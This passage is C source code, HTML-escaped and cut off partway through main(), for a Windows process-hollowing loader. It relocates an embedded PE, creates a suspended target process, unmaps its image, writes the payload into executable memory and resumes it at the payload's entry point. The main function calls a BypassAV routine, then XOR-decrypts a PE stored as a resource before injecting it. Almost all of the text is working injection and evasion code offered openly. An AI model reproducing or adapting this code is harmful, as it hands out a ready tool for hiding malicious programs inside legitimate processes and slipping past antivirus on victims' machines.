pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)file_buffer&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	section_header&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br /><br />	if&nbsp;(va&nbsp;&lt;&nbsp;section_header-&gt;PointerToRawData)<br />		return&nbsp;va;<br /><br />	//&nbsp;loop&nbsp;through&nbsp;sections<br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		//&nbsp;find&nbsp;start&nbsp;and&nbsp;end&nbsp;of&nbsp;current&nbsp;section<br />		DWORD&nbsp;section_start&nbsp;=&nbsp;section_header-&gt;VirtualAddress;<br />		DWORD&nbsp;section_end&nbsp;=&nbsp;section_header-&gt;VirtualAddress&nbsp;+&nbsp;section_header-&gt;SizeOfRawData;<br /><br />		//&nbsp;if&nbsp;the&nbsp;provided&nbsp;RVA&nbsp;is&nbsp;within&nbsp;the&nbsp;bounds&nbsp;of&nbsp;this&nbsp;current&nbsp;section<br />		if&nbsp;(va&nbsp;&gt;=&nbsp;section_start&nbsp;&amp;&amp;&nbsp;va&nbsp;&lt;&nbsp;section_end)<br />		{<br />			//&nbsp;calculate&nbsp;raw&nbsp;address<br />			rva&nbsp;=&nbsp;va&nbsp;-&nbsp;section_start;<br />			raw_address&nbsp;=&nbsp;section_header-&gt;PointerToRawData&nbsp;+&nbsp;rva;<br />			break;<br />		}<br /><br />		//&nbsp;advance&nbsp;to&nbsp;next&nbsp;section<br />		section_header&nbsp;+=&nbsp;1;<br />	}<br /><br />	return&nbsp;raw_address;<br />}<br /><br />/*<br />Get&nbsp;the&nbsp;base&nbsp;address&nbsp;of&nbsp;a&nbsp;remote&nbsp;process.<br />Doesn&#39;t&nbsp;use&nbsp;undocumented&nbsp;structs&nbsp;&amp;&nbsp;functions.<br /><br />Return:<br />	On&nbsp;success,&nbsp;returns&nbsp;image&nbsp;base&nbsp;of&nbsp;target.<br />	On&nbsp;failure,&nbsp;returns&nbsp;NULL.<br />*/<br />LPVOID&nbsp;GetRemoteBaseAddress(HANDLE&nbsp;h_process,&nbsp;HANDLE&nbsp;h_thread)<br />{<br />	BOOL&nbsp;b_ret;<br />	LPVOID&nbsp;image_base_location&nbsp;=&nbsp;NULL;<br />	LPVOID&nbsp;image_base_address&nbsp;=&nbsp;NULL;<br />	CONTEXT&nbsp;remote_ctx&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	remote_ctx.ContextFlags&nbsp;=&nbsp;CONTEXT_FULL;<br /><br />	//&nbsp;get&nbsp;thread&nbsp;info&nbsp;about&nbsp;remote&nbsp;process<br />	b_ret&nbsp;=&nbsp;GetThreadContext(h_thread,&nbsp;&amp;remote_ctx);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		return&nbsp;NULL;<br /><br />	//&nbsp;read&nbsp;base&nbsp;address&nbsp;from&nbsp;registers<br />#ifdef&nbsp;_WIN64<br />	image_base_location&nbsp;=&nbsp;(LPVOID)(remote_ctx.Rdx&nbsp;+&nbsp;16);<br />	b_ret&nbsp;=&nbsp;ReadProcessMemory(h_process,&nbsp;image_base_location,&nbsp;&amp;image_base_address,&nbsp;8,&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		return&nbsp;NULL;<br />#else<br />	image_base_location&nbsp;=&nbsp;(LPVOID)(remote_ctx.Ebx&nbsp;+&nbsp;8);<br />	b_ret&nbsp;=&nbsp;ReadProcessMemory(h_process,&nbsp;image_base_location,&nbsp;&amp;image_base_address,&nbsp;4,&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		return&nbsp;NULL;<br />#endif<br /><br />	return&nbsp;image_base_address;<br />}<br /><br />BOOL&nbsp;PerformBaseRelocations(LPVOID&nbsp;file_buffer,&nbsp;LPVOID&nbsp;original_base,&nbsp;LPVOID&nbsp;new_base)<br />{<br />	BOOL&nbsp;okay&nbsp;=&nbsp;TRUE;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_FILE_HEADER&nbsp;coff_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_OPTIONAL_HEADER&nbsp;pe_optional_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_BASE_RELOCATION&nbsp;reloc_table&nbsp;=&nbsp;NULL;<br />	PIMAGE_BASE_RELOCATION&nbsp;reloc_block&nbsp;=&nbsp;NULL;<br />	PBASE_RELOCATION_ENTRY&nbsp;reloc_entry&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;reloc_table_size&nbsp;=&nbsp;0;<br /><br />	SIZE_T&nbsp;image_base_delta&nbsp;=&nbsp;0;<br /><br />	dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)file_buffer;<br />	pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header&nbsp;+&nbsp;(DWORD_PTR)dos_header-&gt;e_lfanew);<br /><br />	//&nbsp;calcuate&nbsp;difference&nbsp;in&nbsp;base&nbsp;addresses&nbsp;-&nbsp;the&nbsp;delta<br />	image_base_delta&nbsp;=&nbsp;(SIZE_T)new_base&nbsp;-&nbsp;(SIZE_T)original_base;<br /><br />	printf(&quot;\t&nbsp;original&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)original_base);<br />	printf(&quot;\t&nbsp;new&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;new_base);<br />	printf(&quot;\t&nbsp;delta:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)image_base_delta);<br /><br />	if&nbsp;(image_base_delta&nbsp;==&nbsp;0)<br />	{<br />		printf(&quot;[!]&nbsp;image&nbsp;bases&nbsp;are&nbsp;the&nbsp;same.&nbsp;no&nbsp;relocations&nbsp;needed!&nbsp;\n&quot;);<br />		okay&nbsp;=&nbsp;TRUE;<br />		return&nbsp;okay;<br />	}<br /><br />	//&nbsp;grab&nbsp;relocation&nbsp;table<br />	reloc_table&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((DWORD_PTR)file_buffer&nbsp;+&nbsp;va2raw(file_buffer,&nbsp;pe_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));<br />	reloc_table_size&nbsp;=&nbsp;pe_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<br />	printf(&quot;\n\t&nbsp;relocation&nbsp;directory&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;reloc_table);<br /><br />	//&nbsp;grab&nbsp;first&nbsp;relocation&nbsp;block<br />	//&nbsp;first&nbsp;relocation&nbsp;block&nbsp;is&nbsp;at&nbsp;same&nbsp;address&nbsp;as&nbsp;relocation&nbsp;table<br />	reloc_block&nbsp;=&nbsp;reloc_table;<br /><br />	//&nbsp;loop&nbsp;through&nbsp;relocation&nbsp;table<br />	DWORD&nbsp;block_count&nbsp;=&nbsp;1;<br />	DWORD&nbsp;no_of_entries_in_block&nbsp;=&nbsp;0;<br />	DWORD&nbsp;position_in_reloc_table&nbsp;=&nbsp;0;<br /><br />	while&nbsp;(position_in_reloc_table&nbsp;&lt;&nbsp;reloc_table_size)<br />	{<br />		//&nbsp;read&nbsp;block&nbsp;info<br />		no_of_entries_in_block&nbsp;=&nbsp;(reloc_block-&gt;SizeOfBlock&nbsp;-&nbsp;sizeof(IMAGE_BASE_RELOCATION))&nbsp;/&nbsp;sizeof(WORD);<br /><br />		printf(&quot;\t\t&nbsp;block&nbsp;#%d&nbsp;\n&quot;,&nbsp;block_count);<br />		printf(&quot;\t\t\t&nbsp;size:&nbsp;0x%x&nbsp;\n&quot;,&nbsp;reloc_block-&gt;SizeOfBlock);<br />		printf(&quot;\t\t\t&nbsp;no.&nbsp;of&nbsp;entries:&nbsp;%d&nbsp;\n\n&quot;,&nbsp;no_of_entries_in_block);<br /><br />		//&nbsp;grab&nbsp;first&nbsp;relocation&nbsp;entry&nbsp;in&nbsp;block<br />		reloc_entry&nbsp;=&nbsp;(PBASE_RELOCATION_ENTRY)(reloc_block&nbsp;+&nbsp;1);<br /><br />		//&nbsp;loop&nbsp;through&nbsp;entries&nbsp;in&nbsp;block<br />		for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;no_of_entries_in_block;&nbsp;i++)<br />		{<br />			//&nbsp;grab&nbsp;address&nbsp;of&nbsp;relocation.&nbsp;value&nbsp;at&nbsp;that&nbsp;address&nbsp;is&nbsp;the&nbsp;function&nbsp;address&nbsp;to&nbsp;relocate<br />#ifdef&nbsp;_WIN64<br />			PDWORD64&nbsp;reloc_addr&nbsp;=&nbsp;(LPVOID)((DWORD64)file_buffer&nbsp;+&nbsp;va2raw(file_buffer,&nbsp;reloc_block-&gt;VirtualAddress&nbsp;+&nbsp;reloc_entry-&gt;Offset));<br />#else<br />			PDWORD&nbsp;reloc_addr&nbsp;=&nbsp;(LPVOID)((DWORD)file_buffer&nbsp;+&nbsp;va2raw(file_buffer,&nbsp;reloc_block-&gt;VirtualAddress&nbsp;+&nbsp;reloc_entry-&gt;Offset));<br />#endif<br /><br />			printf(&quot;\t\t\t&nbsp;reloc&nbsp;#%d&nbsp;\t[TypeOffset]&nbsp;0x%X%X&nbsp;&quot;,&nbsp;i,&nbsp;reloc_entry-&gt;Type,&nbsp;reloc_entry-&gt;Offset);<br />			printf(&quot;\t\t&nbsp;[original&nbsp;value]&nbsp;0x%p&nbsp;&quot;,&nbsp;(LPVOID)*reloc_addr);<br /><br />			/*<br />			Perform&nbsp;relocations&nbsp;by&nbsp;adding&nbsp;the&nbsp;image&nbsp;base&nbsp;delta&nbsp;to&nbsp;the&nbsp;value&nbsp;stored&nbsp;at&nbsp;the&nbsp;relocation&nbsp;address.<br />			LOW&nbsp;relocations&nbsp;point&nbsp;to&nbsp;the&nbsp;lower&nbsp;8&nbsp;bits&nbsp;of&nbsp;WORD&nbsp;values.<br />			HIGH&nbsp;relocations&nbsp;point&nbsp;to&nbsp;the&nbsp;higher&nbsp;8&nbsp;bits&nbsp;of&nbsp;WORD&nbsp;values.<br />			HIGHLOW&nbsp;relocations&nbsp;point&nbsp;to&nbsp;DWORD&nbsp;values.<br />			DIR64&nbsp;relocations&nbsp;point&nbsp;to&nbsp;DWORD64&nbsp;values.<br />			*/<br />			switch&nbsp;(reloc_entry-&gt;Type)<br />			{<br />			case&nbsp;IMAGE_REL_BASED_ABSOLUTE:		//&nbsp;0<br />				printf(&quot;\t&nbsp;[type]&nbsp;ABSOLUTE-&nbsp;skipping&nbsp;relocation&nbsp;&quot;);<br />				break;<br />			case&nbsp;IMAGE_REL_BASED_HIGH:			//&nbsp;1<br />				printf(&quot;\t&nbsp;[type]&nbsp;HIGH&nbsp;&quot;);<br />				PWORD&nbsp;reloc_addr_HIGH&nbsp;=&nbsp;(PWORD)reloc_addr;				//&nbsp;typecast&nbsp;reloc_addr&nbsp;as&nbsp;a&nbsp;pointer&nbsp;to&nbsp;a&nbsp;WORD<br />				*reloc_addr_HIGH&nbsp;+=&nbsp;HIWORD(image_base_delta);			//&nbsp;add&nbsp;the&nbsp;higher&nbsp;8&nbsp;bits&nbsp;of&nbsp;the&nbsp;delta&nbsp;at&nbsp;reloc_addr<br />				break;<br />			case&nbsp;IMAGE_REL_BASED_LOW:			//&nbsp;2<br />				printf(&quot;\t&nbsp;[type]&nbsp;LOW&nbsp;&quot;);<br />				PWORD&nbsp;reloc_addr_LOW&nbsp;=&nbsp;(PWORD)reloc_addr;				//&nbsp;typecast&nbsp;reloc_addr&nbsp;as&nbsp;a&nbsp;pointer&nbsp;to&nbsp;a&nbsp;WORD<br />				*reloc_addr_LOW&nbsp;+=&nbsp;LOWORD(image_base_delta);			//&nbsp;add&nbsp;the&nbsp;lower&nbsp;8&nbsp;bits&nbsp;of&nbsp;the&nbsp;delta&nbsp;at&nbsp;reloc_addr<br />				break;<br />			case&nbsp;IMAGE_REL_BASED_HIGHLOW:		//&nbsp;3<br />				printf(&quot;\t&nbsp;[type]&nbsp;HIHGLOW&nbsp;&quot;);<br />				PDWORD&nbsp;reloc_addr_HIGHLOW&nbsp;=&nbsp;(PDWORD)reloc_addr;			//&nbsp;typecast&nbsp;reloc_addr&nbsp;as&nbsp;a&nbsp;pointer&nbsp;to&nbsp;a&nbsp;DWORD<br />				*reloc_addr_HIGHLOW&nbsp;+=&nbsp;image_base_delta;				//&nbsp;add&nbsp;the&nbsp;delta&nbsp;to&nbsp;the&nbsp;value&nbsp;at&nbsp;reloc_addr<br />				break;<br />			case&nbsp;IMAGE_REL_BASED_DIR64:			//&nbsp;10<br />				printf(&quot;\t&nbsp;[type]&nbsp;DIR64&nbsp;&quot;);<br />				PDWORD64&nbsp;reloc_addr_DIR64&nbsp;=&nbsp;(PDWORD64)reloc_addr;		//&nbsp;typecast&nbsp;relocAddr&nbsp;as&nbsp;a&nbsp;pointer&nbsp;to&nbsp;a&nbsp;DWORD64<br />				*reloc_addr_DIR64&nbsp;+=&nbsp;image_base_delta;					//&nbsp;add&nbsp;the&nbsp;delta&nbsp;to&nbsp;the&nbsp;value&nbsp;at&nbsp;reloc_addr<br />				break;<br />			default:<br />				printf(&quot;\t&nbsp;[type]&nbsp;UNKNOWN-&nbsp;skipping&nbsp;relocation&nbsp;&quot;);<br />				break;<br />			}<br /><br />			//&nbsp;read&nbsp;data&nbsp;at&nbsp;reloc_addr&nbsp;to&nbsp;check&nbsp;it&#39;s&nbsp;been&nbsp;modified<br />			printf(&quot;\t&nbsp;[modified&nbsp;value]&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)*reloc_addr);<br /><br />			//&nbsp;advance&nbsp;to&nbsp;next&nbsp;entry<br />			reloc_entry&nbsp;+=&nbsp;1;<br />		}<br /><br />		//&nbsp;advance&nbsp;to&nbsp;next&nbsp;block<br />		block_count&nbsp;+=&nbsp;1;<br />		position_in_reloc_table&nbsp;+=&nbsp;reloc_block-&gt;SizeOfBlock;<br />		reloc_block&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((DWORD64)reloc_block&nbsp;+&nbsp;reloc_block-&gt;SizeOfBlock);<br />	}<br /><br />	return&nbsp;okay;<br />}<br /><br />BOOL&nbsp;ProcHollow(LPVOID&nbsp;source_pe,&nbsp;char*&nbsp;target_name,&nbsp;WORD&nbsp;target_subsystem)<br />{<br />	BOOL&nbsp;okay&nbsp;=&nbsp;TRUE;<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	NTSTATUS&nbsp;nt_status;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_SECTION_HEADER&nbsp;section_header&nbsp;=&nbsp;NULL;<br /><br />	LPVOID&nbsp;source_base&nbsp;=&nbsp;NULL;<br />	LPVOID&nbsp;target_base&nbsp;=&nbsp;NULL;<br /><br />	STARTUPINFOA&nbsp;target_si&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	PROCESS_INFORMATION&nbsp;target_pi&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br /><br />	CONTEXT&nbsp;target_ctx&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	target_ctx.ContextFlags&nbsp;=&nbsp;CONTEXT_FULL;<br /><br />	//&nbsp;get&nbsp;source&nbsp;PE&nbsp;info<br />	dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)source_pe;<br />	pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)source_pe&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	source_base&nbsp;=&nbsp;(LPVOID)pe_header-&gt;OptionalHeader.ImageBase;<br /><br />	printf(&quot;[*]&nbsp;source:&nbsp;\n&quot;);<br />	printf(&quot;\t&nbsp;buffer&nbsp;loaded&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;source_pe);<br />	printf(&quot;\t&nbsp;image&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;source_base);<br />	printf(&quot;\t&nbsp;entry&nbsp;point:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)pe_header-&gt;OptionalHeader.AddressOfEntryPoint);<br /><br />	//&nbsp;create&nbsp;a&nbsp;suspended&nbsp;target&nbsp;process<br />	b_ret&nbsp;=&nbsp;CreateProcessA(NULL,&nbsp;target_name,&nbsp;NULL,&nbsp;NULL,&nbsp;FALSE,&nbsp;CREATE_SUSPENDED,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;target_si,&nbsp;&amp;target_pi);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;suspended&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		okay&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;[*]&nbsp;target&nbsp;process&nbsp;created:&nbsp;\&quot;%s\&quot;&nbsp;\n&quot;,&nbsp;target_name);<br /><br />	//&nbsp;grab&nbsp;base&nbsp;address&nbsp;of&nbsp;target&nbsp;process<br />	target_base&nbsp;=&nbsp;GetRemoteBaseAddress(target_pi.hProcess,&nbsp;target_pi.hThread);<br />	if&nbsp;(target_base&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;get&nbsp;base&nbsp;address&nbsp;of&nbsp;target&nbsp;process&nbsp;\n&quot;);<br />		okay&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;\t&nbsp;target&nbsp;base&nbsp;address:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	/*<br />	NOTE:<br />	I&nbsp;can&nbsp;comment&nbsp;out&nbsp;both&nbsp;relocating&nbsp;the&nbsp;PE&nbsp;and&nbsp;changing&nbsp;the&nbsp;source&nbsp;base,&nbsp;and&nbsp;the&nbsp;code&nbsp;will&nbsp;still&nbsp;work.<br />	I&nbsp;have&nbsp;no&nbsp;idea&nbsp;why.&nbsp;Implies&nbsp;my&nbsp;image&nbsp;rebasing&nbsp;is&nbsp;wrong?&nbsp;(but&nbsp;I&nbsp;don&#39;t&nbsp;think&nbsp;it&nbsp;is)<br />	*/<br />	//&nbsp;relocate&nbsp;PE&nbsp;to&nbsp;target&nbsp;base<br />	printf(&quot;[*]&nbsp;performing&nbsp;base&nbsp;relocations&nbsp;\n&quot;);<br />	b_ret&nbsp;=&nbsp;PerformBaseRelocations(source_pe,&nbsp;source_base,&nbsp;target_base);<br /><br />	//&nbsp;change&nbsp;source&nbsp;base&nbsp;address&nbsp;to&nbsp;target&nbsp;base&nbsp;address&nbsp;so&nbsp;that&nbsp;imports&nbsp;will&nbsp;work<br />	pe_header-&gt;OptionalHeader.ImageBase&nbsp;=&nbsp;(SIZE_T)target_base;<br />	printf(&quot;[*]&nbsp;modified&nbsp;source&nbsp;base&nbsp;to&nbsp;target&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)pe_header-&gt;OptionalHeader.ImageBase);<br /><br />	//&nbsp;match&nbsp;the&nbsp;source&nbsp;PE&#39;s&nbsp;subsystem&nbsp;with&nbsp;the&nbsp;target&nbsp;PE&#39;s&nbsp;subsystem&nbsp;(usually&nbsp;Console&nbsp;or&nbsp;GUI)<br />	//&nbsp;you&nbsp;get&nbsp;a&nbsp;0xc00000142&nbsp;error&nbsp;if&nbsp;the&nbsp;source&nbsp;PE&nbsp;and&nbsp;target&nbsp;PE&#39;s&nbsp;subsystems&nbsp;don&#39;t&nbsp;match<br />	pe_header-&gt;OptionalHeader.Subsystem&nbsp;=&nbsp;target_subsystem;<br />	printf(&quot;[*]&nbsp;changed&nbsp;subsystem&nbsp;to:&nbsp;0x%x&nbsp;\n&quot;,&nbsp;target_subsystem);<br /><br />	//&nbsp;hollow&nbsp;out&nbsp;target&nbsp;process&nbsp;from&nbsp;image&nbsp;base<br />	printf(&quot;[*]&nbsp;hollowing...&nbsp;\n&quot;);<br /><br />	d_NtUnmapViewOfSection&nbsp;=&nbsp;(t_NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(&quot;Ntdll.dll&quot;),&nbsp;&quot;NtUnmapViewOfSection&quot;);<br />	nt_status&nbsp;=&nbsp;d_NtUnmapViewOfSection(target_pi.hProcess,&nbsp;target_base);<br />	if&nbsp;(!NT_SUCCESS(nt_status))<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;get&nbsp;hollow&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br />		okay&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;\t&nbsp;target&nbsp;hollowed&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	//&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target&nbsp;process<br />	target_base&nbsp;=&nbsp;VirtualAllocEx(target_pi.hProcess,&nbsp;target_base,&nbsp;pe_header-&gt;OptionalHeader.SizeOfImage,&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />	if&nbsp;(target_base&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br />		okay&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;\t&nbsp;allocated&nbsp;RWX&nbsp;memory&nbsp;in&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	//&nbsp;write&nbsp;PE&nbsp;headers&nbsp;into&nbsp;target<br />	b_ret&nbsp;=&nbsp;WriteProcessMemory(target_pi.hProcess,&nbsp;target_base,&nbsp;source_pe,&nbsp;pe_header-&gt;OptionalHeader.SizeOfHeaders,&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;write&nbsp;PE&nbsp;headers&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br />		okay&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;\t&nbsp;wrote&nbsp;PE&nbsp;headers&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	//&nbsp;write&nbsp;PE&nbsp;sections&nbsp;section&nbsp;1&nbsp;by&nbsp;1&nbsp;(as&nbsp;windows&nbsp;loader&nbsp;does)&nbsp;to&nbsp;map&nbsp;the&nbsp;source&nbsp;PE&nbsp;into&nbsp;the&nbsp;target&#39;s&nbsp;memory<br />	printf(&quot;\t&nbsp;sections:&nbsp;\n&quot;);<br /><br />	section_header&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br />	LPVOID&nbsp;section_address&nbsp;=&nbsp;NULL;<br />	LPVOID&nbsp;write_address&nbsp;=&nbsp;NULL;<br />	for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		section_address&nbsp;=&nbsp;(LPVOID)((DWORD_PTR)source_pe&nbsp;+&nbsp;section_header-&gt;PointerToRawData);<br />		write_address&nbsp;=&nbsp;(LPVOID)((DWORD_PTR)target_base&nbsp;+&nbsp;section_header-&gt;VirtualAddress);<br /><br />		b_ret&nbsp;=&nbsp;WriteProcessMemory(target_pi.hProcess,&nbsp;write_address,&nbsp;section_address,&nbsp;section_header-&gt;SizeOfRawData,&nbsp;0);<br />		if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		{<br />			printf(&quot;\t\t&nbsp;failed&nbsp;to&nbsp;write&nbsp;%s&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;section_header-&gt;Name,&nbsp;write_address);<br />			okay&nbsp;=&nbsp;FALSE;<br />			goto&nbsp;cleanup;<br />		}<br />		else<br />			printf(&quot;\t\t&nbsp;wrote&nbsp;%s&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;section_header-&gt;Name,&nbsp;write_address);<br /><br />		section_header&nbsp;+=&nbsp;1;<br />	}<br /><br />	//&nbsp;grab&nbsp;registers&nbsp;from&nbsp;target&nbsp;process<br />	b_ret&nbsp;=&nbsp;GetThreadContext(target_pi.hThread,&nbsp;&amp;target_ctx);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;grab&nbsp;registers&nbsp;of&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		okay&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />	/*<br />	Copy&nbsp;our&nbsp;injected&nbsp;PE&#39;s&nbsp;entry&nbsp;point&nbsp;into&nbsp;the&nbsp;target&nbsp;process&#39;s&nbsp;register.<br />	-&nbsp;for&nbsp;32bit,&nbsp;the&nbsp;entry&nbsp;point&nbsp;is&nbsp;copied&nbsp;into&nbsp;EAX<br />	-&nbsp;for&nbsp;64bit,&nbsp;it&nbsp;goes&nbsp;in&nbsp;RCX<br />	*/<br />#ifdef&nbsp;_WIN64<br />	target_ctx.Rcx&nbsp;=&nbsp;(DWORD_PTR)target_base&nbsp;+&nbsp;pe_header-&gt;OptionalHeader.AddressOfEntryPoint;<br />	printf(&quot;[*]&nbsp;copied&nbsp;source&nbsp;entry&nbsp;point&nbsp;into&nbsp;RCX:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)target_ctx.Rcx);<br />#else<br />	target_ctx.Eax&nbsp;=&nbsp;(DWORD_PTR)target_base&nbsp;+&nbsp;pe_header-&gt;OptionalHeader.AddressOfEntryPoint;<br />	printf(&quot;[*]&nbsp;copied&nbsp;source&nbsp;entry&nbsp;point&nbsp;into&nbsp;EAX:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)target_ctx.Eax);<br />#endif<br /><br />	//&nbsp;run&nbsp;our&nbsp;injected&nbsp;PE&nbsp;by&nbsp;resuming&nbsp;the&nbsp;process<br />	printf(&quot;[*]&nbsp;process&nbsp;hollowing&nbsp;complete&nbsp;&amp;&nbsp;image&nbsp;mapped.&nbsp;resuming&nbsp;execution...&nbsp;\n&quot;);<br />	SetThreadContext(target_pi.hThread,&nbsp;&amp;target_ctx);<br />	ResumeThread(target_pi.hThread);<br /><br />cleanup:<br />	CloseHandle(target_pi.hProcess);<br />	CloseHandle(target_pi.hThread);<br /><br />	return&nbsp;okay;<br />}<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	DWORD&nbsp;rsrc_size&nbsp;=&nbsp;0;<br />	LPVOID&nbsp;extracted_pe&nbsp;=&nbsp;NULL;<br />	WORD&nbsp;extracted_pe_subsystem&nbsp;=&nbsp;0;<br />	char&nbsp;target_process[MAX_PATH]&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br /><br />	//FreeConsole();<br />	printf(&quot;[*]&nbsp;bypassing&nbsp;AV...&nbsp;\n&quot;);<br />	BypassAV();<br /><br />	//&nbsp;load&nbsp;resource&nbsp;into&nbsp;buffer<br />	extracted_pe&nbsp;=&nbsp;ExtractResource(&amp;rsrc_size);<br />	if&nbsp;(extracted_pe&nbsp;==&nbsp;NULL)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;extract&nbsp;PE&nbsp;from&nbsp;resource:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;resource&nbsp;loaded&nbsp;into&nbsp;memory&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;extracted_pe);<br /><br />	//&nbsp;decrypt<br />	printf(&quot;[*]&nbsp;decrypting&nbsp;PE...&nbsp;\n&quot;);<br />	XOR_buffer(extracted_pe,&nbsp;rsrc_size);<br /><br />#ifdef&nbsp;_DEBUG<br />	char&nbsp;filename[]&nbsp;=&nbsp;&quot;decrypted.bin&quot;;<br />	HANDLE&nbsp;h_file&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;bytes_written&nbsp;=&nbsp;0;<br /><br />	h_file&nbsp;=&nbsp;CreateFileA(filename,&nbsp;GENERIC_ALL,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	WriteFile(h_file,&nbsp;extracted_pe,&nbsp;rsrc_size,&nbsp;&amp;bytes_written,&nbsp;NULL);<br />	CloseHandle(h_file);<br />	printf(&quot;[debug]&nbsp;XOR&#39;d&nbsp;%s&nbsp;created&nbsp;\n&quot;,&nbsp;filename);<br />#endif<br /><br />	